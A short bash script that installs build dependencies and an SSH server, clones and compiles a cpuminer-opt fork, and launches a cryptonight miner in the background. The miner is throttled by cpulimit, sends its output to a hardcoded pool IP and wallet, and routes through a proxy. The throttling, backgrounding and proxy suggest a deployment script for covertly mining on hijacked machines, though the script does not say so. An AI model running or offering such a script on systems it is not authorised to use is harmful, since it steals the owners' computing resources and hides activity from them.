#!/bin/bash
sudo apt-get update && sudo apt-get upgrade -y && sudo apt-get install cpulimit -y && sudo apt-get install automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev gcc build-essential git make curl unzip gedit dh-autoreconf openssh-server screen libtool libncurses5-dev libudev-dev g++ iftop libgtk2.0-dev libboost-dev libboost-system-dev libboost-thread-dev vim -y 
git clone https://github.com/k67frozen/cpuminer-opt
cd cpuminer-opt
chmod +x *
./build.sh
make
cpulimit --exe cpuminer --limit 85 -b && ./cpuminer -a cryptonight -o stratum+tcp://35.185.107.113:3333 -u SFydemsp8ndcUNJrVgUdjADa5YAhhtCD4cFZ7ZCrw7MLQbAAvocLW4JVLmfDdBCC6cBgWhwwhfXoy6Lpu6pkk4W31ebZvmgTu -p x -x 45.32.21.205:2212 --background
